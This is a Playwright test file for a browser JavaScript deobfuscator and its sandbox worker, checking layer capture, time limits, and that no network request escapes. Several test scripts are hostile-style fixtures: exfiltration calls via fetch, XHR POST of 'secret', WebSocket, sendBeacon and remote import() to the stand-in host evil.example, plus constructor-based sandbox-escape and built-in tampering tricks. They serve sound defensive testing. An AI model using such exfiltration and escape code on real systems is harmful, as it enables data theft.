import { readFileSync } from 'node:fs';
import { expect, test, type Page } from '@playwright/test';

// The JavaScript deobfuscator in a real browser: the static peel, and the sandbox, which is a
// dedicated worker of the app's own bundle started by the tool's worker. These are the proofs the
// unit tests cannot give: eval really runs in that worker, the time limit really stops a script that
// never ends, and not one request leaves the browser while hostile scripts run. (The examples of the
// tool are clicked by tools.spec.ts like every other tool's.)

const out = (page: Page) => page.locator('.pane-out');
const sample = (name: string) =>
  readFileSync(new URL(`../public/samples/${name}`, import.meta.url), 'utf8');

/**
 * Open the tool, recording page errors, workers, and every request that leaves the app's origin —
 * counted twice, by a listener and by a route that would abort it, so that one of them failing to
 * see a worker's request cannot hide it.
 */
async function open(page: Page, baseURL: string | undefined) {
  const origin = new URL(baseURL ?? 'http://localhost:4173/').origin;
  const errors: string[] = [];
  const offsite: string[] = [];
  const routed: string[] = [];
  const workers: string[] = [];
  const closed: string[] = [];
  page.on('pageerror', (e) => errors.push(e.message));
  page.on('worker', (w) => {
    workers.push(w.url());
    w.on('close', () => closed.push(w.url()));
  });
  page.context().on('request', (r) => {
    const url = r.url();
    if (!url.startsWith('blob:') && !url.startsWith('data:') && new URL(url).origin !== origin) {
      offsite.push(url);
    }
  });
  await page.route(
    (url) => url.origin !== origin && url.protocol.startsWith('http'),
    (route) => {
      routed.push(route.request().url());
      return route.abort();
    },
  );
  await page.goto('./#/tool/js-deobfuscate');
  return { errors, offsite, routed, workers, closed };
}

async function pickSandbox(page: Page) {
  await page
    .locator('.options')
    .getByRole('button', { name: 'Run in the sandbox', exact: true })
    .click();
}
const runButton = (page: Page) => page.getByRole('button', { name: 'Run', exact: true });

/** Paste a script, choose the sandbox and run it. */
async function sandbox(page: Page, code: string, timeout?: string) {
  await page.locator('.input-text').fill(code);
  await pickSandbox(page);
  if (timeout !== undefined) {
    await page.locator('.options').getByRole('button', { name: timeout, exact: true }).click();
  }
  await runButton(page).click();
  await expect(out(page)).toContainText('Time limit', { timeout: 15_000 });
}

const layersTable = (page: Page) =>
  out(page).locator('.out-table', { hasText: 'Dynamic layers: captured while the script ran' });
const eventsTable = (page: Page) =>
  out(page).locator('.out-table', {
    hasText: 'Blocked attempts, dialogs (never shown) and console output',
  });
const rowsOf = async (table: ReturnType<typeof layersTable>) =>
  table
    .locator('tbody tr')
    .evaluateAll((rows) =>
      rows.map((r) => Array.from(r.querySelectorAll('td'), (td) => td.textContent ?? '')),
    );

test('the static peel opens the sample without running it and starts no sandbox', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  await page.locator('.input-text').fill(sample('js-deobf-static.txt'));
  await runButton(page).click();
  await expect(out(page)).toContainText('Static peel: the code was only read, never run');
  await expect(out(page).locator('.out-text').last()).toContainText('alert("FTF{static_peel}");');
  await expect(out(page)).toContainText('var greeting = "Hello CTF!";');
  await expect(out(page)).toContainText('Static layers: read from the code, nothing was run');
  expect(w.workers.filter((u) => u.includes('sandbox'))).toEqual([]);
  expect(w.errors).toEqual([]);
  expect(w.offsite).toEqual([]);
});

test('the sandbox is a fresh worker of the bundle for each run, never a blob: worker, and it is stopped', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  const origin = new URL(baseURL ?? 'http://localhost:4173/').origin;
  const isSandbox = (u: string) => u.includes('_js-deobf-sandbox.worker');
  await sandbox(page, 'eval("1 + 1")');
  await expect(layersTable(page)).toContainText('eval');
  await runButton(page).click();
  // The table of the first run is still on screen until the second one is drawn: wait for its worker.
  await expect.poll(() => w.workers.filter(isSandbox).length, { timeout: 10_000 }).toBe(2);
  const sandboxes = w.workers.filter(isSandbox);
  // Two runs, two workers, each loaded from a real URL of the app (so it is not under the page's
  // no-eval policy, and not a blob: URL, which would be).
  expect(sandboxes).toHaveLength(2);
  for (const u of sandboxes) {
    expect(u.startsWith(`${origin}/assets/`)).toBe(true);
    expect(u).toMatch(/\.js$/);
  }
  expect(w.workers.filter((u) => u.startsWith('blob:') || u.startsWith('data:'))).toEqual([]);
  // Each one was terminated by the tool once its result was in.
  await expect.poll(() => w.closed.filter(isSandbox).length, { timeout: 5000 }).toBe(2);
  expect(w.errors).toEqual([]);
});

test('Function(Function("return \'\\141\\75\\160\'")())(): both layers, and the final code a=p', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  const bs = String.fromCharCode(92);
  await sandbox(page, `Function(Function("return '${bs}141${bs}75${bs}160'")())()`);
  const rows = await rowsOf(layersTable(page));
  expect(rows.map((r) => r.slice(0, 5))).toEqual([
    ['1', 'Function', "return 'a=p'", 'a=p', ''],
    ['2', 'Function', 'a=p', '', 'ReferenceError: p is not defined'],
  ]);
  await expect(out(page).locator('.out-text', { hasText: 'Final code' }).first()).toContainText(
    'a=p',
  );
  await expect(out(page)).toContainText('The script: stopped with an error');
  expect(w.errors).toEqual([]);
});

test('eval(atob(eval(atob(…)))) two levels: the layers come in order, with a Copy button each', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  await sandbox(page, sample('js-deobf-nested-eval.txt'));
  const rows = await rowsOf(layersTable(page));
  expect(rows.map((r) => r[1])).toEqual(['atob', 'eval', 'atob', 'eval']);
  expect(rows[3]![2]).toBe('alert("FTF{nested_eval}");');
  const blocks = out(page).locator('.out-text', { hasText: /^Layer \d/ });
  await expect(blocks).toHaveCount(4);
  for (let i = 0; i < 4; i++)
    await expect(blocks.nth(i).getByRole('button', { name: 'Copy' })).toBeVisible();
  await expect(eventsTable(page)).toContainText('FTF{nested_eval}');
  expect(w.errors).toEqual([]);
});

test('(0)["constructor"]["constructor"] is caught like Function', async ({ page, baseURL }) => {
  await open(page, baseURL);
  await sandbox(page, `(0)['constructor']['constructor']("return 'FTF{' + 8 * 8 + '}'")()`);
  const rows = await rowsOf(layersTable(page));
  expect(rows[0]!.slice(1, 4)).toEqual(['Function', "return 'FTF{' + 8 * 8 + '}'", 'FTF{64}']);
});

test('a script that tries to get out gets only the sandbox, and no request is made', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  const code = `
    var g = this.constructor.constructor("return this")();
    var report = ["same:" + (g === self)];
    report.push("process:" + typeof process + " require:" + typeof require + " module:" + typeof module);
    var names = ["fetch", "XMLHttpRequest", "WebSocket", "importScripts", "EventSource", "Worker", "SharedWorker", "postMessage", "indexedDB", "caches"];
    for (var i = 0; i < names.length; i++) {
      var f = g[names[i]], how;
      if (typeof f !== "function") how = "undefined";
      else {
        try {
          var r = f("https://evil.example/" + names[i]);
          if (r && typeof r.then === "function") { r.then(null, function () {}); how = "rejects"; }
          else how = "inert";
        } catch (e) { how = "throws"; }
      }
      report.push(names[i] + ":" + how);
    }
    alert(report.join(" "));
    alert(typeof g.eval + " " + String(g.eval).slice(0, 12));
    new XMLHttpRequest().open("GET", "https://evil.example/xhr");
    navigator.sendBeacon("https://evil.example/beacon", "x");
  `;
  await sandbox(page, code);
  const events = await rowsOf(eventsTable(page));
  const dialogs = events.filter((r) => r[0] === 'Dialog · alert').map((r) => r[1]);
  expect(dialogs[0]).toBe(
    'same:true process:undefined require:undefined module:undefined fetch:rejects XMLHttpRequest:inert WebSocket:throws importScripts:throws EventSource:throws Worker:throws SharedWorker:throws postMessage:inert indexedDB:undefined caches:undefined',
  );
  const sinks = events
    .filter((r) => r[0]!.startsWith('Blocked · '))
    .map((r) => `${r[0]!.slice('Blocked · '.length)} ${r[1]}`);
  expect(sinks).toContain('fetch https://evil.example/fetch');
  expect(sinks).toContain('XMLHttpRequest GET https://evil.example/xhr');
  expect(sinks).toContain('sendBeacon https://evil.example/beacon');
  expect(w.offsite).toEqual([]);
  expect(w.routed).toEqual([]);
  expect(w.errors).toEqual([]);
});

test('a script that breaks the built-ins and closes the worker still gets recorded', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  const code = `
    Array.prototype.push = function () { throw new Error("push"); };
    String.prototype.slice = function () { return "x"; };
    String.prototype.indexOf = function () { return -1; };
    String.prototype.charCodeAt = function () { return 0; };
    Reflect.apply = function () { throw new Error("apply"); };
    Object.defineProperty = function () { throw new Error("define"); };
    RegExp.prototype.test = function () { return false; };
    Error.prepareStackTrace = function () { return "pwned"; };
    self.close(); close();
    var made = [
      (function* () {}).constructor("yield 1"),
      (async function () {}).constructor("return 2"),
      Object.getPrototypeOf(async function* () {}).constructor("yield 3"),
      Function.prototype.constructor("return 4"),
      Reflect.construct(Function, ["return 5"]),
      (0)["constructor"]["constructor"]("return 6"),
    ];
    eval('import("https://evil.example/late.js").catch(function () {})');
    alert(made.length + " " + String(Error.prepareStackTrace));
  `;
  await sandbox(page, code);
  const rows = await rowsOf(layersTable(page));
  expect(rows.map((r) => r[1])).toEqual([
    'GeneratorFunction',
    'AsyncFunction',
    'AsyncGeneratorFunction',
    'Function',
    'Function',
    'Function',
    'eval',
  ]);
  const events = await rowsOf(eventsTable(page));
  expect(events.map((r) => `${r[0]} ${r[1]}`)).toEqual(
    expect.arrayContaining([
      'Blocked · close ',
      'Blocked · import() https://evil.example/late.js',
      'Dialog · alert 6 undefined',
    ]),
  );
  // It was the sandbox that answered, not the time limit: the script's own close() did nothing.
  await expect(out(page)).toContainText('The script: ran to the end');
  expect(w.offsite).toEqual([]);
  expect(w.routed).toEqual([]);
  expect(w.errors).toEqual([]);
});

test('every way to fetch is recorded and none leaves the browser', async ({ page, baseURL }) => {
  const w = await open(page, baseURL);
  const code = `
    fetch("https://evil.example/fetch").catch(function () {});
    var x = new XMLHttpRequest(); x.open("POST", "https://evil.example/xhr"); x.send("secret");
    try { new WebSocket("wss://evil.example/ws"); } catch (e) {}
    try { new EventSource("https://evil.example/es"); } catch (e) {}
    try { new Worker("https://evil.example/worker.js"); } catch (e) {}
    try { importScripts("https://evil.example/is.js"); } catch (e) {}
    navigator.sendBeacon("https://evil.example/beacon");
    import("https://evil.example/module.js").catch(function () {});
    eval('import("https://evil.example/eval-module.js").catch(function () {})');
    Function('return import("https://evil.example/function-module.js")')().catch(function () {});
    setTimeout('import("https://evil.example/timer-module.js").catch(function () {})', 0);
    setTimeout("fetch('https://evil.example/timer-fetch').catch(function () {})", 0);
    try { new FontFace("f", "url(https://evil.example/font.woff2)"); } catch (e) {}
    Promise.resolve().then(function () { return fetch("https://evil.example/late"); }).catch(function () {});
  `;
  await sandbox(page, code);
  const events = await rowsOf(eventsTable(page));
  const sinks = events
    .filter((r) => r[0]!.startsWith('Blocked · '))
    .map((r) => `${r[0]!.slice('Blocked · '.length)} ${r[1]}`);
  for (const expected of [
    'fetch https://evil.example/fetch',
    'XMLHttpRequest POST https://evil.example/xhr',
    'XMLHttpRequest.send secret',
    'WebSocket wss://evil.example/ws',
    'EventSource https://evil.example/es',
    'Worker https://evil.example/worker.js',
    'importScripts https://evil.example/is.js',
    'sendBeacon https://evil.example/beacon',
    'import() https://evil.example/module.js',
    'import() https://evil.example/eval-module.js',
    'import() https://evil.example/function-module.js',
    'import() https://evil.example/timer-module.js',
    'fetch https://evil.example/timer-fetch',
    'fetch https://evil.example/late',
  ]) {
    expect(sinks, expected).toContain(expected);
  }
  await expect(out(page)).toContainText('No request was made.');
  // Neither the listener nor the route saw a request to anywhere but this app.
  expect(w.offsite).toEqual([]);
  expect(w.routed).toEqual([]);
  expect(w.errors).toEqual([]);
});

test('control: the same watch does see a request that a worker makes unhindered', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  // A same-origin script that fetches: this is what a sandbox without the stubs would allow.
  await page.route('**/__control-worker.js', (route) =>
    route.fulfill({
      contentType: 'text/javascript',
      body: "fetch('https://control.example/ping').catch(function () {});",
    }),
  );
  await page.evaluate(() => {
    new Worker('/__control-worker.js');
  });
  await expect
    .poll(() => w.offsite.length + w.routed.length, { timeout: 10_000 })
    .toBeGreaterThan(0);
  expect([...w.offsite, ...w.routed].some((u) => u.startsWith('https://control.example/'))).toBe(
    true,
  );
});

test('while (1) {} is cut by the time limit and the page stays alive', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  await page.locator('.input-text').fill('eval("1"); while (1) {}');
  await pickSandbox(page);
  const t0 = Date.now();
  await runButton(page).click();
  await expect(out(page)).toContainText('The time limit (1000 ms) was reached', {
    timeout: 10_000,
  });
  const elapsed = Date.now() - t0;
  // 1000 ms of limit, plus the start of the worker and the drawing of the result.
  expect(elapsed).toBeLessThan(3500);
  // The layer captured before the loop was kept: the worker sent it while it was still running.
  expect(await rowsOf(layersTable(page))).toHaveLength(1);
  await expect(out(page)).toContainText('The script: was cut at the time limit');
  // And the app answers: another run works.
  await page.locator('.input-text').fill('alert("again")');
  await runButton(page).click();
  await expect(eventsTable(page)).toContainText('again');
  expect(w.errors).toEqual([]);
});

test('starting another run replaces the one in progress at once, and the cancelled worker is freed', async ({
  page,
  baseURL,
}) => {
  const w = await open(page, baseURL);
  const isSandbox = (u: string) => u.includes('_js-deobf-sandbox.worker');
  await page.locator('.input-text').fill('for (;;) {}');
  await pickSandbox(page);
  await page.locator('.options').getByRole('button', { name: '2 s', exact: true }).click();
  await runButton(page).click();
  await expect.poll(() => w.workers.filter(isSandbox).length, { timeout: 10_000 }).toBe(1);
  const t0 = Date.now();
  await page.locator('.input-text').fill('alert("second")');
  await runButton(page).click();
  await expect(eventsTable(page)).toContainText('second', { timeout: 10_000 });
  // The new run did not wait for the 2 s limit of the one it replaced.
  expect(Date.now() - t0).toBeLessThan(1800);
  // The old sandbox worker is stopped with the tool worker that had started it. A browser frees a
  // worker that is stuck in a loop a little after it is told to (Chromium: about 2 s later).
  await expect.poll(() => w.closed.filter(isSandbox).length, { timeout: 8000 }).toBe(2);
  expect(w.errors).toEqual([]);
});

test('the time limit can be shortened', async ({ page, baseURL }) => {
  await open(page, baseURL);
  const t0 = Date.now();
  await sandbox(page, 'for (;;) {}', '0.2 s');
  await expect(out(page)).toContainText('The time limit (200 ms) was reached');
  expect(Date.now() - t0).toBeLessThan(3500);
});

test('a megabyte of script does not freeze the page, in either mode', async ({ page, baseURL }) => {
  const w = await open(page, baseURL);
  const big = `/*${'x'.repeat(1_000_000)}*/ var s = "${String.fromCharCode(92)}x41" + "B"; alert(s);`;
  await page.evaluate((text) => {
    const ta = document.querySelector<HTMLTextAreaElement>('.input-text')!;
    ta.value = text;
    ta.dispatchEvent(new Event('input', { bubbles: true }));
    (window as unknown as { __gap: number }).__gap = 0;
    let last = performance.now();
    setInterval(() => {
      const now = performance.now();
      (window as unknown as { __gap: number }).__gap = Math.max(
        (window as unknown as { __gap: number }).__gap,
        now - last,
      );
      last = now;
    }, 20);
  }, big);
  await runButton(page).click();
  await expect(out(page)).toContainText('Static peel', { timeout: 20_000 });
  await pickSandbox(page);
  await runButton(page).click();
  await expect(eventsTable(page)).toContainText('AB', { timeout: 20_000 });
  const gap = await page.evaluate(() => (window as unknown as { __gap: number }).__gap);
  // The work is in workers: the page's own thread was never blocked for long.
  expect(gap).toBeLessThan(1000);
  expect(w.errors).toEqual([]);
  expect(w.offsite).toEqual([]);
});

test('the buttons under the result open the decoders with the final code', async ({
  page,
  baseURL,
}) => {
  await open(page, baseURL);
  await page.locator('.input-text').fill(sample('js-deobf-static.txt'));
  await runButton(page).click();
  await expect(out(page)).toContainText('Result of the static peel');
  await out(page).getByRole('button', { name: 'Open in Base64' }).click();
  await expect(page).toHaveURL(/#\/tool\/base64/);
  await expect(page.locator('.input-text')).toHaveValue(/alert\("FTF\{static_peel\}"\);/);
});

test('"Run it in the sandbox" switches the mode and runs', async ({ page, baseURL }) => {
  await open(page, baseURL);
  await page.locator('.input-text').fill('eval(atob("YWxlcnQoIkZURntidXR0b259Iik="))');
  await runButton(page).click();
  await out(page).getByRole('button', { name: 'Run it in the sandbox' }).click();
  await expect(eventsTable(page)).toContainText('FTF{button}');
  await expect(
    page.locator('.options').getByRole('button', { name: 'Run in the sandbox', exact: true }),
  ).toHaveAttribute('aria-pressed', 'true');
});

test('the time limit is only shown for the sandbox, and is 1 s unless changed', async ({
  page,
  baseURL,
}) => {
  await open(page, baseURL);
  const limit = page.locator('.options').getByRole('group', { name: 'Time limit' });
  await expect(limit).toHaveCount(0);
  await pickSandbox(page);
  await expect(limit).toBeVisible();
  await expect(limit.getByRole('button', { name: '1 s', exact: true })).toHaveAttribute(
    'aria-pressed',
    'true',
  );
});

test('home triage suggests the tool for an eval(atob()) script, in the safe mode', async ({
  page,
}) => {
  await page.goto('./');
  await page.getByLabel('Paste data to identify').fill(sample('js-deobf-nested-eval.txt'));
  const guess = page.locator('.guess', { hasText: 'JavaScript deobfuscator' });
  await expect(guess).toBeVisible();
  await guess.click();
  await expect(page).toHaveURL(/#\/tool\/js-deobfuscate/);
  await expect(out(page)).toContainText('Static peel');
  await expect(
    page.locator('.options').getByRole('button', { name: 'Peel (nothing is run)' }),
  ).toHaveAttribute('aria-pressed', 'true');
});

test('the texts come in the chosen language, layers and limits included', async ({ page }) => {
  await page.addInitScript(() => localStorage.setItem('ftf.locale', 'fr'));
  await page.goto('./#/tool/js-deobfuscate');
  await expect(page.locator('h1')).toHaveText('Déobfuscateur JavaScript (bac à sable)');
  await page.locator('.input-text').fill('eval(atob("YWxlcnQoMSk="))');
  await page
    .locator('.options')
    .getByRole('button', { name: 'Exécuter dans le bac à sable', exact: true })
    .click();
  await page.getByRole('button', { name: 'Lancer', exact: true }).click();
  await expect(out(page)).toContainText(
    "Couches dynamiques : capturées pendant l'exécution du script",
  );
  await expect(out(page)).toContainText('Conception testée');
  await expect(out(page)).toContainText('Limites :');
});
